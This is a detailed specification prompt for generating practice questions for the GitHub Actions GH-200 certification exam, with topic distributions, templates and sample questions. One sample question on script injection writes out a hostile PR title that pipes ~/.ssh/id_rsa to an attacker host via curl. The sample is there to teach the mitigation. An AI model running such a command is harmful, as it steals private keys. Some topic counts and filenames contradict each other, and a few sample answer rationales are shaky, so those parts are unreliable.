# GitHub Actions (GH-200) Exam Question Generator — Revised

## Executive Summary

This prompt guides generation of **400 high-quality exam-style questions** for the GitHub Actions GH-200 certification. Questions will be scenario-based, cognitively rigorous, and aligned with the 19 topic files from the split GitHub Workflows Guide. **The prompt supports iteration**: run it multiple times to generate different question sets with varied scenarios and distractors.

---

## Quick Reference

| Parameter | Value |
|-----------|-------|
| **Total Questions** | 400 per iteration |
| **Topics** | 19 |
| **Difficulty Split** | 20% Easy / 60% Medium / 20% Hard |
| **Answer Types** | 55% `one` / 26% `many` / 12% `all` / 7% `none` |
| **Scenario-Based Minimum** | 70% (280+ questions) |
| **Options Per Question** | 4 (5 for complex questions) |
| **Security Minimum** | 45 questions (Topics 6, 7, 18) |
| **Enterprise Minimum** | 36 questions (Topics 8, 14, 17) |
| **Cross-Topic Minimum** | 20 questions |
| **Output File** | `quiz\gh-200-iteration-[N].md` |
| **Deduplication Source** | `quiz\gh-200.md` (if it exists) |
| **Default Iteration** | 1 (increment to regenerate a different set) |

---

## 1. Objective

Generate 400 multiple-choice certification exam questions that follows `exam-overview.md` GH-200 exam skill domain breakdown and weights

- Test practical knowledge of GitHub Actions workflows, runners, security, and enterprise features
- Avoid pure recall; emphasize application, analysis, and decision-making
- Reflect real-world scenarios and job responsibilities
- Maintain consistency with official GitHub documentation and exam standards
- Include rigorous distractors that capture common misconceptions
- **Support iteration**: Enable different question generation on subsequent runs (variation in scenarios, answer positions, distractor selection)

---

## 2. Source Material

### Primary Reference Files (19 topics)

All files located in: `github-actions\`

1. `01-GitHub-Actions-VS-Code-Extension.md` — Extension features, validation, local development
2. `02-Contextual-Information.md` — GitHub, env, secrets, job, runner, steps, matrix, inputs, needs, strategy contexts
3. `03-Context-Availability-Reference.md` — Context scope by workflow key, static vs. runtime evaluation, secret leakage
4. `04-Workflow-File-Structure.md` — File structure, jobs, steps, container, services, permissions, YAML anchors
5. `05-Workflow-Trigger-Events.md` — 26+ trigger events (push, pull_request, schedule, workflow_dispatch, etc.)
6. `06-Custom-Environment-Variables.md` — Workflow/job/step-level vars, secrets, contexts, GITHUB_OUTPUT, defaults
7. `07-Default-Environment-Variables.md` — Built-in vars (workflow info, runner info, API tokens, CI flag, debug mode)
8. `08-Environment-Protection-Rules.md` — Required reviewers, deployment branches, wait timers, custom rules
9. `09-Workflow-Artifacts.md` — Upload, download, retention, storage limits, metadata, releases
10. `10-Workflow-Caching.md` — Cache basics, multiple paths, language-specific strategies, advanced patterns
11. `11-Workflow-Sharing.md` — Reusable workflows, shared actions, starter templates, workflow status badges
12. `12-Workflow-Debugging.md` — Logs, RUNNER_DEBUG, workflow commands, performance profiling, advanced techniques
13. `13-Workflows-REST-API.md` — List workflows, list runs, get details, trigger, re-run, cancel, delete, list jobs/artifacts
14. `14-Reviewing-Deployments.md` — Environment configuration, review process, deployment review workflows, monitoring
15. `15-Creating-Publishing-Actions.md` — JavaScript/composite/Docker actions, marketplace publishing, versioning, distribution
16. `16-Managing-Runners.md` — Hosted runners, self-hosted setup, labels, organization, scaling, maintenance, best practices
17. `17-GitHub-Actions-Enterprise.md` — Org policies, access control, runner groups, IP allow lists, secrets hierarchy, audit logging
18. `18-Security-and-Optimization.md` — GITHUB_TOKEN lifecycle, OIDC, SHA pinning, script injection, trustworthy actions, attestations
19. `19-Common-Failures-Troubleshooting.md` — Authentication, dependencies, timeouts, syntax, runners, artifacts, caching, secrets, matrix, performance

### Deduplication Database

- **File**: `quiz\gh-200.md` (if exists in workspace; else skip deduplication check)
- **Purpose**: Avoid semantic duplication of previously generated questions

---

## 3. Question Generation Targets

### Total Output

- **Total Questions**: 400 questions
- **Distribution**: ~21 questions per topic file (allows for variable coverage by domain importance)

### Distribution by Topic (Recommended)

> **Note**: Counts were recalibrated from an earlier draft that incorrectly summed to 420. These corrected values total exactly 400.

| Topic # | Topic Name | Questions | Rationale |
| ------- | ---------- | --------- | --------- |
| 1 | VS Code Extension | 12 | Tools & features (foundational) |
| 2 | Contextual Information | 23 | Core knowledge; 10 context types |
| 3 | Context Availability | 19 | Static vs. runtime; advanced concept |
| 4 | Workflow File Structure | 27 | Fundamental; many properties to test |
| 5 | Trigger Events | 27 | 26+ events; common exam focus |
| 6 | Custom Env Vars | 21 | Practical, scenario-heavy |
| 7 | Default Env Vars | 19 | Reference knowledge; practical use |
| 8 | Environment Protection | 21 | Enterprise/security focus |
| 9 | Artifacts | 23 | Practical; common workflows |
| 10 | Caching | 22 | Performance optimization; strategy |
| 11 | Workflow Sharing | 19 | Reusability; marketplace |
| 12 | Debugging | 21 | Troubleshooting; real-world scenarios |
| 13 | REST API | 19 | Automation; advanced use |
| 14 | Deployment Review | 15 | Enterprise/governance |
| 15 | Creating/Publishing Actions | 21 | Advanced; marketplace |
| 16 | Managing Runners | 21 | Operational; enterprise focus |
| 17 | Enterprise Features | 23 | Policy, groups, audit; high exam weight |
| 18 | Security & Optimization | 26 | OIDC, script injection, SHA pinning; critical |
| 19 | Troubleshooting | 21 | Problem-solving; real scenarios |
| **TOTAL** | | **400** | |

---

## 4. Question Difficulty & Cognitive Levels

### Distribution by Difficulty

| Difficulty | % | Count | Cognitive Level | Example Focus |
| ---------- | --- | ----- | --------------- | -------------- |
| **Easy** | 20% | 80 | Recall + Comprehension | "What does this context contain?" |
| **Medium** | 60% | 240 | Application + Analysis | "Which trigger event should you use for...?" |
| **Hard** | 20% | 80 | Synthesis + Evaluation | "Identify the scenario where this approach fails..." |

### Cognitive Level Definitions

- **Recall/Comprehension** (Easy): Direct from guide; minimal reasoning
- **Application** (Medium): Apply knowledge to new situation; select correct tool
- **Analysis** (Medium-Hard): Break apart scenario; identify root cause or best practice
- **Synthesis** (Hard): Combine multiple concepts; design/optimize a solution
- **Evaluation** (Hard): Judge trade-offs; identify pitfalls or best practice

---

## 5. Answer Type Distribution

Distribute answer types across the 400 questions:

| Answer Type | % of 400 | Count | Definition |
| ----------- | -------- | ----- | --------- |
| `one` | 55% | 220 | Exactly one correct answer |
| `many` | 26% | 104 | Multiple correct answers (2–4) |
| `all` | 12% | 48 | All options are correct (rare but valid) |
| `none` | 7% | 28 | "Which is NOT true...?" or no correct answer |

### Implementation Notes

- **`one`**: Standard format; 4–5 options
- **`many`**: Clearly marked "Select all that apply"; 4–5 options
- **`all`**: Use sparingly; all 4 options must be defensibly correct
- **`none`**: Phrased as "Which of the following is NOT..." or "Which statement is FALSE..."

---

## 6. Answer Option Design

### General Principles

1. **Exactly 4 options** for all questions (some can have 5 if complex)
2. **Plausibility**: Each distractor should be chosen by someone with ~50% knowledge
3. **Logical grouping**: Similar wrong answers ≈ different wrong answers (mix it up)
4. **No "all of the above" or "none of the above"** unless explicitly required

### Distractor Strategy

| Distractor Type | Example | When to Use |
| --------------- | ------- | ----------- |
| **Partial knowledge** | Correct concept, wrong context | Most common |
| **Common misconception** | "Secrets are always available" | Security topics |
| **Off-by-one / precedence error** | Wrong behavior order | Workflow structure |
| **Alternative but wrong tool** | "Use workflow_dispatch instead" | Event selection |
| **Close but not best** | "This works but isn't recommended" | Best practices |

---

## 7. Question Template

```markdown
### Question [N] — [Domain]

**Difficulty**: Easy | Medium | Hard
**Answer Type**: one | many | all | none
**Topic**: [e.g., "GITHUB_TOKEN permissions", "Matrix strategies", "Runner groups"]

**Scenario** _(if applicable)_:
[2–3 sentences setting up a real-world situation]

**Question**:
[Clear, unambiguous question; avoid double negatives]

- A) [Plausible option]
- B) [Correct or correct option]
- C) [Plausible distractor]
- D) [Plausible distractor]
- E) [Optional; use only if needed for clarity]

---
```

### Key Template Rules

- **No "Choose the best answer"** — say "Which is correct?" or "Which statement is true?"
- **For `many` type**: Add **(Select all that apply)** after the question
- **Avoid vague language**: "sometimes", "usually", "might" — be specific
- **Double-check**: Question must be answerable from the guide alone
- **YAML code blocks**: Format workflow snippets as fenced ` ```yaml ` blocks; keep them concise (5–15 lines); focus the snippet on the concept being tested

---

### Sample Questions (Illustrative Examples)

The following examples demonstrate expected quality, format, and difficulty range.

---

#### Example 1 — Easy (`one`)

**Difficulty**: Easy
**Answer Type**: one
**Topic**: Default Environment Variables (07)

**Question**:
Which default environment variable contains the GitHub REST API URL used by the current workflow run?

- A) `GITHUB_SERVER_URL`
- B) `GITHUB_API_URL`
- C) `GITHUB_GRAPHQL_URL`
- D) `GITHUB_TOKEN`

**Answer**: B — `GITHUB_API_URL` holds the REST API base URL (e.g., `https://api.github.com`). `GITHUB_SERVER_URL` is the web UI URL, `GITHUB_GRAPHQL_URL` is the GraphQL endpoint, and `GITHUB_TOKEN` is a credential, not a URL.

---

#### Example 2 — Medium (`many`)

**Difficulty**: Medium
**Answer Type**: many
**Topic**: Workflow Artifacts (09)

**Scenario**:
Your CI pipeline uploads test results and build binaries in a `build` job. A downstream `deploy` job downloads them. The deploy job intermittently reports that artifact downloads are empty or incomplete.

**Question** (Select all that apply):
Which actions would improve artifact reliability between jobs?

- A) Add `if: always()` to the upload step so artifacts are uploaded even on failure
- B) Pin `actions/upload-artifact` and `actions/download-artifact` to matching major versions
- C) Set `retention-days: 90` to prevent early expiration during long-running pipelines
- D) Replace `path: .` with a specific glob pattern targeting only required output files

**Answer**: B, D — Pinning to matching versions prevents API compatibility issues; a precise glob avoids uploading unnecessary files that can cause partial or inconsistent downloads. `if: always()` aids debugging but does not fix reliability when the build itself fails. `retention-days` controls expiry, not mid-run consistency.

---

#### Example 3 — Hard (`one`)

**Difficulty**: Hard
**Answer Type**: one
**Topic**: Security & Optimization — Script Injection (18)

**Scenario**:
A workflow step processes user-controlled PR titles:

```yaml
- name: Print PR title
  run: echo "Processing PR: ${{ github.event.pull_request.title }}"
```

An attacker creates a PR titled: `valid title"; curl https://attacker.com/?d=$(cat ~/.ssh/id_rsa); echo "`

**Question**:
Which mitigation correctly prevents script injection without disabling the step?

- A) Wrap the expression in single quotes: `echo 'PR: ${{ github.event.pull_request.title }}'`
- B) Use `${{ toJson(github.event.pull_request.title) }}` to JSON-encode the value inline
- C) Set the title as an environment variable and reference it as `$PR_TITLE` in the shell command
- D) Add `permissions: read-all` to the job to restrict token scope

**Answer**: C — Assigning the untrusted value to an environment variable (`PR_TITLE: ${{ github.event.pull_request.title }}`) and referencing `$PR_TITLE` in the shell prevents injection because the value is passed as data, never interpolated into the command string. A (single quotes) prevents variable expansion entirely. B (`toJson`) adds JSON encoding but does not prevent shell interpretation. D (permissions) limits the token scope but has no effect on command injection.

---

## 8. Answer Key Format

```markdown
---

## Answer Key

| Q# | Answer(s) | Explanation | Source | Difficulty |
|----|-----------|-------------|--------|------------|
| 1 | B, D | [Brief rationale; 1–2 sentences] | [File name] | Medium |
| 2 | All | [Why all are correct] | [File name] | Hard |
| 3 | D | [Why D is correct; why others are wrong] | [File name] | Easy |
| ... | ... | ... | ... | ... |

```

### Answer Key Guidelines

- **Explanation**: ~2–3 sentences max; cite specific guide sections
- **Source**: Reference the topic file (e.g., "18-Security-and-Optimization.md")
- **Completeness**: Optionally explain each distractor: "A is wrong because..."

---

## 9. Quality Assurance Rules

### Clarity & Precision

- ✓ Each question is unambiguous; only one reasonable interpretation
- ✓ Scenario is realistic and reflects job responsibilities
- ✓ No grammatical errors, typos, or awkward phrasing
- ✗ Avoid: "Which of these may or may not..." (ambiguous)
- ✗ Avoid: Double negatives: "You should NOT avoid NOT using..."

### Exam Language & Phrasing

| ✓ Recommended | ✗ Avoid |
| ------------- | ------- |
| "You are required to..." | "You should..." |
| "Which is the best practice?" | "Which might be the best?" |
| "True or False: [Statement]" | "How true is...?" |
| "What does [X] do?" | "What might [X] possibly do?" |
| "Select all that apply" | "Which are sometimes correct?" |

### Deduplication

- **Check against `quiz\gh-200.md`** (if exists): Identify semantically similar questions
- **Avoid repeating** the same scenario structure more than 2–3 times
- **Vary the focus**: If one question tests "when to use matrix", next shouldn't repeat that exact concept

### Plausibility Check

For each distractor, ask: *Would a candidate with 50% knowledge pick this?*

- If yes → keep it
- If no → make it more plausible or replace

---

## 10. Domain-Specific Focus Areas

### Security & Tokenization (Topics 18, 6–7)

- GITHUB_TOKEN lifecycle: when available, scope, redaction
- OIDC token usage: cloud federation, subject claims, setup
- SHA pinning: why immutable commits matter; semver vs. SHA
- Script injection: shell quoting, sanitization, untrusted input
- Secret leakage: environment variables vs. hardcoding; masking limitations
- Trustworthy actions: assessment framework, pinning strategy

#### Minimum 45 questions on security topics

### Enterprise & Governance (Topics 17, 8, 14)

- Runner groups: permission model, scaling, cost optimization
- IP allow lists: use cases, configuration
- Secrets hierarchy: org vs. repo vs. environment scope
- Audit logging: event types, streaming, compliance
- Environment protection rules: required reviewers, wait timers, custom rules
- Deployment review workflows: pause, approve, monitor

#### Minimum 36 questions on enterprise topics

### Real-World Scenarios (Topics 5, 9–12, 19)

- Workflow design: trigger selection, event payload
- Matrix builds: combinations, fail-fast, job indexing
- Artifact workflows: upload from build, download in another job
- Caching strategy: dependency selection, cache keys, miss handling
- Debugging: log streaming, RUNNER_DEBUG, slow step identification
- Troubleshooting: common errors, root cause, solutions

#### Minimum 147 questions scenario-based

### Advanced & Synthesis (All topics)

- Trade-off decisions: "You need X, Y, Z. Which approach is best?"
- Architecture decisions: "Design a workflow that..."
- Optimization: "How can you reduce execution time?"
- Error recovery: "An artifact upload fails midway; what happens?"

#### Minimum 56 questions requiring synthesis/evaluation

---

## 11. Special Instructions & Rules

### SHA Pinning & Immutability

- **Include at least 2–3 questions** on pinning actions to full commit SHAs
- Focus on: why, when, trade-offs between SHA and semver
- Test understanding of: `@v2` vs. `@abc123def` vs. `@refs/tags/v2.0.0`

### Script Injection & Security

- **Include at least 2–3 questions** on identifying/preventing script injection
- Scenarios: environment variable manipulation, dynamic step selection, user input
- Test: proper quoting, sanitization functions, risk assessment

### Matrix & Job Dependencies

- **Include at least 2–3 questions** on matrix combinations and fail-fast behavior
- Scenarios: 3×2×2 matrix → job counts; conditional matrix values; job indices
- Test: `strategy.job-index`, `strategy.job-total`, fail-fast implications

### OIDC & Cloud Federation

- **Include at least 1–2 questions** on OIDC token setup and usage
- Focus on: AWS, Azure, GCP federation; subject claims; trust relationships
- Test: when to use OIDC vs. secrets; benefits (no long-lived secrets)

### REST API Automation

- **Include at least 1–2 questions** on API-driven workflows
- Scenarios: trigger workflow via API, list failed runs, re-run selectively
- Test: API rate limits, authentication, pagination

### Contextual Scenarios to Avoid Repeating

- Don't ask "What is `github.sha`?" 5 times (test understanding, not recall)
- Instead: "Your workflow needs the commit SHA on PR head. Where do you get it?" (analysis)
- Vary the job: "You're in a job that depends on another. How do you access a previous job's output?"

### Wording Style for Clarity

- **Use imperative mood**: "You need to..." not "One might..."
- **Specify constraints**: "In a reusable workflow called by another workflow, which contexts are available?"
- **Base on real scenarios**: "Your CI is slow; which caching strategy..."

### YAML Code Blocks in Questions

- **Minimum 30 questions** should include a relevant YAML workflow snippet
- Keep code blocks to 5–15 lines; focus the snippet on the concept under test
- Use ` ```yaml ` fenced blocks for all workflow fragments
- Label snippets clearly: "workflow fragment", "job definition", or "step definition"
- For error-identification questions, intentionally embed a subtle bug in the YAML; do not explain it in the scenario
- Use realistic `runs-on`, action references (with SHA pins or version tags), and `env` / `with` blocks to reflect real-world patterns

**Example snippet format**:

```yaml
jobs:
  release:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1
```

### Cross-Topic Synthesis Questions

At least **20 questions** must combine concepts from two or more topic files. These reflect the real exam's synthesis challenge and cannot be answered by recalling a single section.

**Recommended Topic Combinations**:

| Topics | Example Focus |
|--------|---------------|
| 2 + 18 (Context + Security) | Which context expression leaks a secret value into workflow logs? |
| 5 + 8 (Triggers + Environments) | Which trigger event bypasses environment protection rules? |
| 9 + 10 (Artifacts + Caching) | When should you prefer a cache over an artifact for build output? |
| 15 + 18 (Custom Actions + Security) | Which action reference strategy is safest for a third-party action? |
| 16 + 17 (Runners + Enterprise) | How does a runner group restrict which workflows can use a self-hosted runner? |
| 4 + 6 (Structure + Variables) | At which scope does this variable definition take precedence? |
| 11 + 5 (Workflow Sharing + Triggers) | Which trigger event is unavailable when using a reusable workflow caller? |
| 12 + 19 (Debugging + Troubleshooting) | Which debug technique identifies the specific step that introduced the timeout? |
| 3 + 2 (Context Availability + Context Info) | Which context is only available at workflow level, not within a step? |
| 18 + 7 (Security + Default Vars) | Which default variable must never be echoed to a public log? |

**Tag cross-topic questions** in the template with all applicable topic numbers:

```markdown
**Topic**: Caching (10) + Artifacts (09) — Cross-Topic
```

---

## 12. Question Structure & Balance

### By Complexity & Scenario Depth

| Question Type | % | Example | Difficulty |
| ------------- | - | ------- | ---------- |
| Single concept | 20% | "What does `runner.os` contain?" | Easy |
| Scenario + decision | 50% | "Your build has 3 stages; which trigger should...?" | Medium |
| Multi-concept + trade-off | 25% | "Compare: caching vs. artifacts; when use each?" | Hard |
| Edge case / error | 5% | "If two jobs write same artifact, what happens?" | Hard |

### By Answer Distribution (Across 100 Questions)

- A, B, C, D should each appear as correct answer ~25 times (balanced)
- Avoid pattern: correct answer is always B or D
- Check randomness of `one` vs. `many` vs. `all` vs. `none` distribution

---

## 13. Output File Specification

### File Name

- **Primary**: `quiz\gh-200-new.md`
- **Alternative** (if appending): Append to `quiz\gh-200.md` with date marker and "NEW QUESTIONS (Generated [DATE])" section

### File Structure

```plaintext
# GH-200 Certification Exam — Practice Questions

## Questions (400 total — Iteration [N])

### Question 1 — [Domain]
[Full question with options]

### Question 2 — [Domain]
[Full question with options]

...

---

## Answer Key

| Q# | Answer(s) | Explanation | Source | Difficulty |
...

---

## Statistics

- **Total Questions**: 400
- **Iteration Number**: [N] (1 for first run; increment for different question sets)
- **Difficulty Distribution**: 80 Easy, 240 Medium, 80 Hard
- **Answer Type Distribution**: 220 one, 104 many, 48 all, 28 none
- **Generation Date**: [Date]
- **Topics Covered**: All 19
- **Scenario-Based**: ~280 questions (70%+)
- **Average Question Length**: [X] words
- **Deduplication**: Checked against all previous iterations

```

---

## 14. Process Workflow (For Implementation)

1. **Preparation**

   - Load all 19 topic files
   - Load `quiz\gh-200.md` (if exists) for deduplication
   - Load/read ITERATION_NUMBER (default: 1) for question variation
   - Organize by topic; target ~21 questions per topic

2. **Generation Pass 1: Easy (80 questions)**

   - Generate recall/comprehension questions
   - Direct from guide content
   - Distribute across topics
   - Vary scenarios by iteration number (seed RNG with iteration)

3. **Generation Pass 2: Medium (240 questions)**

   - Scenario-based; application/analysis
   - Mix of decision-making, bug-finding, best-practice selection
   - Prioritize enterprise, security, and real-world patterns
   - Randomize distractor order by iteration (shuffle wrong answers)

4. **Generation Pass 3: Hard (80 questions)**

   - Synthesis, evaluation, trade-offs
   - Multi-concept combinations
   - Edge cases and error recovery
   - Vary edge cases tested by iteration

5. **Quality Review**

   - Check clarity, grammar, ambiguity
   - Verify options are plausible
   - Confirm answer key matches options
   - Confirm no semantic duplication with previous iterations

6. **Finalization**

   - Balance answer distribution (A/B/C/D)
   - Verify percentages (55% one, 26% many, etc.)
   - Generate statistics block
   - Append to `quiz\gh-200-all-iterations.md` OR export to `quiz\gh-200-iteration-[N].md`
   - Document iteration number and generation timestamp

---

## 15. Defaults Applied & Assumptions

| Item | Default | Rationale |
| ---- | ------- | --------- |
| **Total Questions** | 400 | Extended practice set; comprehensive exam coverage |
| **Options per Question** | 4 (up to 5) | Standard format; reduces cognitive load |
| **Difficulty Split** | 20/60/20 | Typical exam distribution |
| **Answer Types** | 55/26/12/7 | Realistic mix; mostly `one`, some `many`, rare `all`/`none` |
| **Scenario Weight** | 70% | Practical exam focus; tests application not recall |
| **Domain Focus** | Enterprise, Security, Real Scenarios | GH-200 exam priorities |
| **Deduplication** | Checked | Avoid duplicate concepts across iterations |
| **Source Verification** | All 19 topics | Comprehensive coverage |
| **Iteration Number** | 1 (default) | Seed for randomization; increment to generate new question set |

---

## 16. Known Constraints & Limitations

- **Time**: Generation may take significant effort; quality over speed
- **Deduplication**: Manual if `quiz\gh-200.md` doesn't exist in standard format
- **Scenario Complexity**: Some scenarios may require long setups; balance with clarity
- **Answer Key Brevity**: Keep explanations concise (2–3 sentences) but complete
- **Topic Imbalance**: Topics 2, 4, 5, 18 naturally have more exam weight; adjust distribution as needed

---

## 17. Iteration & Randomization Strategy

### Purpose

Enable **regeneration of different question sets** while maintaining exam quality and coverage. Use iteration number as a seed for pseudorandom variation.

### Iteration Mechanics

**Iteration Number** (passed as parameter or read from file):

- **Iteration 1**: Initial generation; baseline questions
- **Iteration 2+**: Different questions using same topic coverage and difficulty splits

### Randomization Points

1. **Scenario Selection**
   - Use `hash(topic + iteration) % scenarios_per_topic` to select which scenario to use
   - Store 2–3 scenario variants per topic; rotate by iteration
   - Example: For Topic 5 (Trigger Events), generate questions about different triggers each iteration

2. **Distractor Shuffling**
   - Seed random number generator with `hash(question_id + iteration)`
   - Shuffle answer option positions (A/B/C/D)
   - Use different wrong answers from distractor pool
   - Example: Same correct answer, but different distractors on Iteration 2

3. **Edge Cases & Focus**
   - Vary which edge cases are tested (e.g., container vs. service edge case in Iteration 1, matrix fail-fast in Iteration 2)
   - Select different "gotchas" from focus area
   - Example: Iteration 1 tests GITHUB_TOKEN availability in container, Iteration 2 tests permission depth

4. **Complexity Level Within Difficulty**
   - Vary complexity within the same difficulty tier
   - Easy iteration 1: "What does `github.sha` contain?" vs. Easy iteration 2: "In a PullRequest event, which context gives you the base branch commit?"
   - Hard iteration 1: Multi-concept combinations vs. Hard iteration 2: Edge case error recovery

### Implementation Example (Pseudocode)

```python
def generate_questions(iteration_number=1):
    seed = hash("GH-200-" + str(iteration_number))
    random.seed(seed)

    for topic_idx in range(1, 20):
        target_count = QUESTIONS_PER_TOPIC[topic_idx]
        scenario_variants = SCENARIO_POOL[topic_idx]

        for q_idx in range(target_count):
            # Select scenario variant based on iteration
            scenario_seed = hash(f"topic_{topic_idx}_q_{q_idx}_iter_{iteration_number}")
            scenario_idx = scenario_seed % len(scenario_variants)
            scenario = scenario_variants[scenario_idx]

            # Generate question with varied distractors
            question = generate_question_from_scenario(
                scenario,
                iteration=iteration_number,
                rng_seed=scenario_seed
            )

            # Shuffle answer positions
            shuffle_answers(question, seed=scenario_seed)

            questions.append(question)

    return questions
```

### Output File Strategy

**Option A: Separate Files Per Iteration** (Recommended)

- `quiz\gh-200-iteration-1.md` (first run)
- `quiz\gh-200-iteration-2.md` (second run)
- `quiz\gh-200-iteration-3.md` (third run)
- Pros: Easy comparison; clear versioning; no duplicates
- Cons: Multiple files

#### Option B: Single Append File

- `quiz\gh-200-all-iterations.md` (combined)
- Format: `---` delimiter between iterations; metadata header for each iteration
- Pros: All questions in one place
- Cons: Harder to track which iteration a question came from

**Recommended**: Use **Option A**; include iteration info in output filename

### Deduplication Across Iterations

- **Before generating new iteration**: Check all previous `quiz\gh-200-iteration-*.md` files
- **Semantic comparison**: Avoid identical scenario structures
  - Example: "Your matrix is 3×2; how many jobs?" shouldn't repeat if Iteration 1 asked it
- **Variation measurement**: Spot-check 5–10 questions across iterations; confirm they're materially different

### Regeneration Workflow

1. **Increment iteration number**: `ITERATION_NUMBER += 1`
2. **Run generation process** with new iteration number
3. **Output to**: `quiz\gh-200-iteration-[N].md` (where N = iteration number)
4. **Verify differences**: Spot-check Q1, Q50, Q100+ across iterations for variation
5. **Archive previous**: Keep all iterations for test bank expansion

### Quality Assurance for Iterations

- **No semantic duplication**: Each iteration is meaningfully different
- **Difficulty distribution maintained**: Still 80 Easy / 240 Medium / 80 Hard per iteration
- **Answer type distribution maintained**: Still 55% one, 26% many, etc.
- **Topic coverage maintained**: Still ~15–30 questions per topic
- **Focus area minimums met**: Still 45+ security, 36+ enterprise, 147+ scenarios

---

## 18. Success Criteria

✓ 400 questions generated per iteration
✓ 0 duplicates within iteration; deduplication tracked across iterations
✓ 70%+ scenario-based (not pure recall)
✓ All questions answerable from guide alone
✓ Clear, unambiguous wording
✓ Plausible distractors for each question
✓ Balanced answer distribution (A/B/C/D ~100 each)
✓ Proper answer key with explanations
✓ Focus areas met (security: 45+, enterprise: 36+, scenarios: 147+, synthesis: 56+)
✓ Statistics block complete with iteration number
✓ Different questions generated on subsequent iterations (verified by spot check of 5–10 questions)
✓ Iteration number stored and documented in output file

---

## 19. Revision Notes

### Issues Fixed in This Revision

- ✓ Clarified **total question count** (100 vs. ambiguous "8–10 per 100 lines")
- ✓ Split **distribution table** showing questions per topic
- ✓ Expanded **cognitive levels** with definitions and examples
- ✓ Clarified **answer types** with implementation guidance
- ✓ Added **distractor strategy table** for consistency
- ✓ Provided **exam language rules** with examples
- ✓ Added **domain-specific minimum counts** (security, enterprise, scenarios)
- ✓ Created **complexity matrix** for question variety
- ✓ Specified **file naming and output structure** clearly
- ✓ Added **process workflow** for implementation
- ✓ Applied **recommended defaults** with rationale
- ✓ Fixed references to corrected file names (e.g., "02-Contextual-Information.md")
- ✓ Added **success criteria checklist**
- ✓ Added **statistics block template**

### Recommendations for Use

1. Use this as a **detailed specification**, not a vague brief
2. Generate questions in **3 passes** (Easy → Medium → Hard) for better pacing
3. **Validate each question** against the template before finalizing
4. **Spot-check distractor plausibility** with a peer or test group
5. **Run deduplication** against `quiz\gh-200.md` before output
6. **Export statistics** automatically if possible (count by difficulty, answer type, etc.)

---

## 20. Sample Questions (By Difficulty & Type)

### Easy Example (Recall/Comprehension)

**Question 1** — Contextual Information

**Difficulty**: Easy | **Answer Type**: one | **Topic**: GitHub context contents

**Question**: Which of the following is contained in the `github` context?

- A) The current step execution time
- B) The workflow run ID and repository information
- C) The runner's operating system details
- D) The matrix strategy configuration

**Answer**: B | **Explanation**: The `github` context contains workflow run metadata including run ID, SHA, ref, repository, actor, and other GitHub-specific info. The runner OS is in `runner` context, step timing in `job`, and matrix in `strategy`.

---

### Medium Example (Application/Analysis)

**Question 2** — Workflow Trigger Events

**Difficulty**: Medium | **Answer Type**: one | **Topic**: Event trigger selection

**Scenario**: Your team needs to run a deployment workflow only when code is merged to `main`, not on pull requests. The deployment requires approval from a designated environment first.

**Question**: Which trigger event should you use, combined with environment protection rules?

- A) `pull_request` with environment filters
- B) `push` to the `main` branch with environment protection rules
- C) `workflow_dispatch` triggered manually
- D) `schedule` on a cron expression

**Answer**: B | **Explanation**: The `push` event triggers on merges to `main`. Environment protection rules then enforce required reviewers and approvals before deployment proceeds. `pull_request` wouldn't work (it's on PR, not merge), `workflow_dispatch` is manual, and `schedule` is time-based.

---

### Hard Example (Synthesis/Evaluation)

**Question 3** — Security & OIDC

**Difficulty**: Hard | **Answer Type**: many | **Topic**: Token strategy trade-offs

**Scenario**: Your organization currently uses long-lived PAT tokens stored as secrets for AWS deployments. You're evaluating OIDC for better security posture. (Select all that apply)

**Question**: Which statements accurately reflect advantages of OIDC over long-lived secrets?

- A) OIDC tokens are automatically rotated with each workflow run
- B) OIDC eliminates the need to store credentials in GitHub; AWS validates the OIDC token directly
- C) OIDC supports fine-grained subject claims (repo, branch, environment) for access control
- D) OIDC allows deploying to multiple cloud providers (AWS, Azure, GCP) with the same configuration
- E) OIDC has no risk of token leakage because tokens are never stored

**Answer**: A, B, C | **Explanation**: OIDC uses short-lived tokens automatically issued per run (A); AWS validates the token directly without needing stored credentials (B); subject claims enable precise access control (C). (D) is partially true but setup varies per cloud. (E) is false—token leakage risk still exists but is mitigated by short lifetime.

---

## 21. Topic-Specific Guidance & Common Misconceptions

### Topic 1: VS Code Extension (12 questions)

**Key Concepts to Prioritize**:

- Local workflow validation without running
- Extension marketplace vs. local authoring
- YAML linting and context intelligence

**Common Misconceptions**:

- The extension runs workflows locally (it doesn't; it validates syntax)
- The extension replaces the need for `act` or container-based testing
- All GitHub Actions documentation is built into the extension

**Scenario Patterns**:

- Validation before commit
- Troubleshooting YAML syntax in IDE
- Using extension for local development workflow

---

### Topic 2: Contextual Information (26 questions)

**Key Concepts to Prioritize**:

- All 10 context types and their relationships
- Runtime vs. static context evaluation
- Context scope by workflow key

**Common Misconceptions**:

- All contexts are available at all times (they're not; scope is restricted)
- `secrets` context can be used outside of expressions
- `env` context is global across all jobs

**Scenario Patterns**:

- Accessing nested context properties
- Debugging context availability issues
- Combining multiple contexts in expressions

---

### Topic 5: Trigger Events (30 questions)

**Key Concepts to Prioritize**:

- 26+ events and their trigger conditions
- Event payload structure and availability
- Filtering by branch, tag, path

**Common Misconceptions**:

- `push` is the same as `pull_request` (different events, different payloads)
- All trigger events support `paths` filtering (some don't)
- Scheduled jobs can access git commit info (they can't; it's synthetic)

**Scenario Patterns**:

- Conditional workflow logic based on event type
- Matrix builds triggered by specific events
- Complex filtering (branch + path combinations)

---

### Topic 18: Security & Optimization (29 questions)

**Key Concepts to Prioritize**:

- GITHUB_TOKEN permissions and lifecycle
- OIDC federation and subject claims
- Script injection vectors and mitigation
- SHA pinning vs. semver trade-offs
- Trustworthy actions assessment

**Common Misconceptions**:

- GITHUB_TOKEN is always available with full permissions (false; scoped by default)
- SHA pinning prevents all supply chain attacks (false; provides integrity, not behavior verification)
- Using `@latest` is equivalent to `@main` (false; different refs, different guarantees)
- Secrets are never logged (false; they can leak in certain error scenarios)

**Scenario Patterns**:

- Identifying script injection vulnerabilities
- Designing least-privilege token scopes
- Evaluating action trustworthiness
- Balancing security with maintainability

---

## 22. Scenario Repository & Pool

### Sample Scenario Variants by Topic

**Topic 5: Trigger Events**

| Scenario | Description | Question Focus |
| --- | --- | --- |
| **Push to main** | Code merged to main branch | Deployment readiness |
| **PR on feature branch** | Pull request opened from feature | Testing/validation gate |
| **Release tag** | Git tag created matching semver pattern | Release automation |
